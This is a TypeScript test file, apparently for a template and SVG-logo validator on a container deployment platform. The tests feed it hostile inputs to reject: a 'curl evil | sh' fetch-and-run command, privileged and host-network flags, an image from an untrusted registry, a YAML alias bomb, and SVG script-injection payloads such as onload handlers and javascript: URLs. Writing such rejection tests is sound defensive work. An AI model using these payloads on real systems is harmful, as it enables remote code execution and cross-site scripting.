import { describe, expect, test } from "bun:test";
import { checkTemplate, logoErrors, parseTemplate } from "./lib";

const digest = `sha256:${"a".repeat(64)}`;
const base = {
  schema: 1,
  id: "demo",
  name: "Demo",
  description: "A small service used to test the validator.",
  category: "other",
  tier: "community",
  author: "someone",
  version: "1.0.0",
  minPyoVersion: "0.1.0",
  source: { type: "image", image: "docker.io/acme/demo", versions: [{ tag: "1.0", digest }] },
  kind: "service",
  workload: "Deployment",
  stateful: false,
  replicas: 1,
  resources: { cpuRequest: 100, cpuLimit: 200, memoryRequest: 64, memoryLimit: 128 },
  ports: [{ name: "http", port: 8080, protocol: "HTTP", exposure: "http" }],
  healthCheck: { type: "http", path: "/", port: 8080, initialDelaySeconds: 5, periodSeconds: 10 },
  env: [{ key: "MODE", value: "production" }],
  fields: [],
  hints: [],
};
const check = (patch: object = {}) => checkTemplate({ ...base, ...patch }, "demo");
const image = (over: object) => ({ source: { ...base.source, ...over } });

describe("templates", () => {
  test("a good one passes", () => expect(check()).toEqual([]));

  test("nothing outside the format gets through", () => {
    expect(check({ privileged: true }).join()).toContain('"privileged" isn\'t allowed');
    expect(check({ hostNetwork: true }).join()).toContain("isn't allowed");
    expect(check({ command: ["sh", "-c", "curl evil | sh"] }).join()).toContain("isn't allowed");
  });

  test("GPUs: optional or required, with storage for the models", () => {
    const storage = { required: true, sizeGi: 50, mountPath: "/models" };
    expect(check({ gpu: { use: "optional", count: 1 }, storage })).toEqual([]);
    expect(check({ gpu: { use: "required", count: 1 } }).join()).toContain("storage");
    expect(check({ gpu: { use: "always", count: 1 }, storage })).not.toEqual([]);
    expect(check({ gpu: { use: "required", count: 9 }, storage })).not.toEqual([]);
  });

  test("args go to the entrypoint and only name fields", () => {
    const fields = [{ key: "model", label: "Model", type: "text", required: true }];
    expect(check({ args: ["{{model}}", "--port", "8000"], fields })).toEqual([]);
    expect(check({ args: ["{{nope}}"], fields }).join()).toContain("isn't a field");
    expect(check({ args: [""] })).not.toEqual([]);
  });

  test("a database is connected under the template's names", () => {
    const database = { engine: "mysql", env: { WORDPRESS_DB_HOST: "MYSQL_HOST:MYSQL_PORT", WORDPRESS_DB_PASSWORD: "MYSQL_PASSWORD" } };
    const one = (d: object) => ({ databases: [d] });
    expect(check(one(database))).toEqual([]);
    expect(check(one({ ...database, engine: "oracle" }))).not.toEqual([]);
    expect(check(one({ engine: "mysql", env: { X: "REDIS_URL" } }))).not.toEqual([]);
    expect(check(one({ engine: "mysql", env: { X: "MYSQL_HOST:" } }))).not.toEqual([]);
    expect(check(one({ engine: "mysql", env: { "1X": "MYSQL_HOST" } }))).not.toEqual([]);
    expect(check(one({ engine: "mysql", env: {} }))).not.toEqual([]);
    expect(check(one({ engine: "mysql", env: { MODE: "MYSQL_HOST" } })).join()).toContain("the database sets it");
    const pg = { engine: "postgres", env: { DATABASE_URL: "DATABASE_URL_DIRECT" } };
    const kv = { engine: "kv", env: { REDIS_HOST: "REDIS_HOST", REDIS_PORT: "REDIS_PORT" } };
    expect(check({ databases: [pg, kv] })).toEqual([]);
    expect(check({ databases: [pg, pg] }).join()).toContain("one of each engine");
    expect(check({ databases: [pg, { engine: "kv", env: { DATABASE_URL: "REDIS_URL" } }] }).join()).toContain("another database");
    expect(check(one({ engine: "kv", env: { X: "DATABASE_URL" } })).join()).toContain("kv offers");
  });

  test("references are to the service itself only", () => {
    expect(check({ env: [{ key: "url", value: "${{self.PUBLIC_URL}}" }] })).toEqual([]);
    expect(check({ env: [{ key: "url", value: "${{postgres.DATABASE_URL}}" }] }).join()).toContain("self");
  });

  test("the id matches its folder", () =>
    expect(checkTemplate(base, "other").join()).toContain("must match"));

  test("only upsetdev authors official templates", () =>
    expect(check({ tier: "official" }).join()).toContain("official"));

  test("images are pinned", () => {
    expect(check(image({ versions: [{ tag: "1.0", digest: "" }] }))).not.toEqual([]);
    expect(check(image({ versions: [{ tag: "1.0" }] }))).not.toEqual([]);
    expect(check(image({ versions: [{ tag: "latest", digest }] })).join()).toContain("latest");
  });

  test("an unquoted version is caught", () => {
    const raw = parseTemplate("tag: 17.2") as { tag: unknown };
    expect(check(image({ versions: [{ tag: raw.tag, digest }] }))).not.toEqual([]);
  });

  test("only public registries", () =>
    expect(check(image({ image: "evil.example/acme/demo" })).join()).toContain("allowed registry"));

  test("secrets never have values", () => {
    expect(check({ env: [{ key: "TOKEN", value: "hunter2", secret: true, generate: true }] }).join()).toContain("can't have a value");
    expect(check({ env: [{ key: "TOKEN", secret: true }] }).join()).toContain("generate");
    expect(check({ env: [{ key: "DB_PASSWORD", value: "hunter2" }] }).join()).toContain("looks like a secret");
    expect(check({ env: [{ key: "A" }], fields: [{ key: "a", label: "A", type: "password", default: "x", required: false, sensitive: true, envKey: "A" }] }).join()).toContain("can't have a default");
  });

  test("fields and resources stay consistent", () => {
    expect(check({ fields: [{ key: "a", label: "A", type: "text", required: true, envKey: "NOPE" }] }).join()).toContain("isn't in env");
    expect(check({ fields: [{ key: "version", label: "V", type: "text", required: true }] }).join()).toContain("x-pyo.versions");
    expect(check({ resources: { ...base.resources, cpuRequest: 500 } }).join()).toContain("cpuRequest");
    expect(check({ stateful: true }).join()).toContain("storage");
  });
});

describe("yaml", () => {
  test("aliases are refused", () =>
    expect(() => parseTemplate("a: &x [1,2]\nb: [*x, *x]\nc: [*x, *x]\n")).toThrow());
  test("duplicate keys are refused", () =>
    expect(() => parseTemplate("a: 1\na: 2\n")).toThrow());
  test("huge files are refused", () =>
    expect(() => parseTemplate("a: ".concat("x".repeat(70_000)))).toThrow());
});

describe("logos", () => {
  const ok = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#fff" d="M0 0h24"/></svg>';
  test("a plain drawing passes", () => expect(logoErrors(ok)).toEqual([]));
  test.each([
    ["script", "<svg><script>alert(1)</script></svg>"],
    ["handler", '<svg onload="alert(1)"></svg>'],
    ["link", '<svg><a href="https://evil.example"></a></svg>'],
    ["image", '<svg><image href="https://evil.example/x.png"/></svg>'],
    ["foreignObject", "<svg><foreignObject></foreignObject></svg>"],
    ["javascript", '<svg><path fill="javascript:alert(1)"/></svg>'],
    ["doctype", '<?xml version="1.0"?><svg></svg>'],
    ["not svg", "<html></html>"],
  ])("refuses %s", (_, svg) => expect(logoErrors(svg)).not.toEqual([]));
});
